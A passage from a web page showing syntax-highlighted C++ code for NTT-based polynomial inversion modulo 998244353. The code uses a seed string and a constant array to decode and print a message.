<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(aa, </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, L </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> L; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">b</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">2</span><span style="color: #FFEB95">ll</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">b</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">aa</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> mod) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span>
<span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">main</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> N; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">s</span><span style="color: #D6DEEB">[i </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">22</span><span style="color: #D6DEEB">];</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">polyinv</span><span style="color: #D6DEEB">(N);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(b, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(c, </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (ll)</span><span style="color: #C5E478">b</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">c</span><span style="color: #D6DEEB">[i] </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">ntt</span><span style="color: #D6DEEB">(a, </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">, N </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> N; </span><span style="color: #C792EA">++</span><span style="color: #D6DEEB">i)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">putchar</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">a</span><span style="color: #D6DEEB">[i]);</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">algorithm</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">cstring</span><span style="color: #111111">&gt;</span></span>
<span><span style="color: #994CC3">#include</span><span style="color: #403F53"> </span><span style="color: #111111">&lt;</span><span style="color: #C96765">iostream</span><span style="color: #111111">&gt;</span></span>
<span></span>
<span><span style="color: #994CC3">using</span><span style="color: #403F53"> </span><span style="color: #994CC3">namespace</span><span style="color: #403F53"> std;</span></span>
<span></span>
<span><span style="color: #994CC3">typedef</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> ll;</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> mod </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">998244353</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> N </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> G </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">3</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> n, </span><span style="color: #4876D6">r</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">];</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">c</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x0000270c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0000429c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0000675b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00007f8a</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0000a59b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0000c1cd</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0000f6cb</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00010e02</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x00012f88</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00014c8b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00015525</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00018924</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0001a398</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0001b545</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0001c2af</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0002018c</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x0001fdd4</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00023333</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00026068</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00029557</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00028aef</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0002a872</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0002e6e4</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0002ee5e</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x00030a9d</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00030cee</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00033ec0</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0003629a</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00037487</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00039d4e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0003e2f7</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0003eccf</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x0004304b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00045d64</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0004715e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0004c474</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0004ea5e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0004f081</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0004fe29</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00052656</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x00053dc1</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005355a</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00054bb5</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005560c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005296c</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005523e</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00054cba</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00053930</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x0005265f</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x000552f2</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005316a</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00053e95</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00055823</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x000564b7</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00052cdc</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00051228</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #AA0982">0x00055f28</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00054d58</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x0005454b</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00052f57</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00054d6f</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00053e11</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00055f91</span><span style="color: #403F53">, </span><span style="color: #AA0982">0x00055a50</span><span style="color: #403F53">};</span></span>
<span></span>
<span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">char</span><span style="color: #403F53"> s[] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">welcome to the world of polynomial</span><span style="color: #111111">&quot;</span><span style="color: #403F53">;</span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">a</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">], </span><span style="color: #4876D6">b</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">], </span><span style="color: #4876D6">aa</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">], </span><span style="color: #4876D6">bb</span><span style="color: #403F53">[N </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">];</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53"> x, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> y)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> out </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">while</span><span style="color: #403F53"> (y)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (y </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">            out </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)out </span><span style="color: #994CC3">*</span><span style="color: #403F53"> x </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">        x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)x </span><span style="color: #994CC3">*</span><span style="color: #403F53"> x </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">        y </span><span style="color: #994CC3">&gt;&gt;=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> out;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">void</span><span style="color: #403F53"> </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">A, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> type, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> L)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> i, j, k, wn, w, t;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">r</span><span style="color: #403F53">[i])</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">swap</span><span style="color: #403F53">(</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i], </span><span style="color: #4876D6">A</span><span style="color: #403F53">[</span><span style="color: #4876D6">r</span><span style="color: #403F53">[i]]);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; i </span><span style="color: #994CC3">&lt;&lt;=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        wn </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(G, (mod </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">/</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; j </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> i </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (k </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">, w </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; k </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> i; </span><span style="color: #994CC3">++</span><span style="color: #403F53">k, w </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)w </span><span style="color: #994CC3">*</span><span style="color: #403F53"> wn </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod)</span></span>
<span><span style="color: #403F53">            {</span></span>
<span><span style="color: #403F53">                t </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> w </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">A</span><span style="color: #403F53">[i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">-</span><span style="color: #403F53"> t </span><span style="color: #994CC3">+</span><span style="color: #403F53"> mod) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">A</span><span style="color: #403F53">[j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> k] </span><span style="color: #994CC3">+</span><span style="color: #403F53"> t) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">            }</span></span>
<span><span style="color: #403F53">        }</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (type </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">reverse</span><span style="color: #403F53">(A </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">, A </span><span style="color: #994CC3">+</span><span style="color: #403F53"> L);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">int</span><span style="color: #403F53"> inv </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(L, mod </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">A</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">A</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> inv </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">void</span><span style="color: #403F53"> </span><span style="color: #4876D6">polyinv</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53"> L)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (L </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #AA0982">0</span><span style="color: #403F53">] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">qpow</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">[</span><span style="color: #AA0982">0</span><span style="color: #403F53">], mod </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">return</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">int</span><span style="color: #403F53"> i;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">polyinv</span><span style="color: #403F53">(L </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">memset</span><span style="color: #403F53">(bb, </span><span style="color: #AA0982">0</span><span style="color: #403F53">, </span><span style="color: #0C969B">sizeof</span><span style="color: #403F53">(bb));</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">memcpy</span><span style="color: #403F53">(bb, b, </span><span style="color: #0C969B">sizeof</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> (L </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">));</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">memcpy</span><span style="color: #403F53">(aa, a, </span><span style="color: #0C969B">sizeof</span><span style="color: #403F53">(</span><span style="color: #994CC3">int</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> L);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> (L </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">); </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">r</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">r</span><span style="color: #403F53">[i </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">] </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">|</span><span style="color: #403F53"> ((i </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> L);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(aa, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, L </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(bb, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, L </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> (L </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">); </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">aa</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (ll)</span><span style="color: #4876D6">aa</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #4876D6">bb</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #4876D6">bb</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">ntt</span><span style="color: #403F53">(aa, </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">, L </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> L; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">b</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #AA0982">2ll</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #4876D6">b</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #4876D6">aa</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">+</span><span style="color: #403F53"> mod) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod;</span></span>
<span><span style="color: #403F53">}</span></span>
<span></span>
<span><span style="color: #994CC3">int</span><span style="color: #403F53"> </span><span style="color: #4876D6">main</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> N; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">a</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">[i </span><span style="color: #994CC3">%</span><span style="color: #403F53"> </span><span style="color: #AA0982">0x22</span><span style="color: #403F53">];</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">polyinv</span><span style="color: #403F53">(N);</span></span>
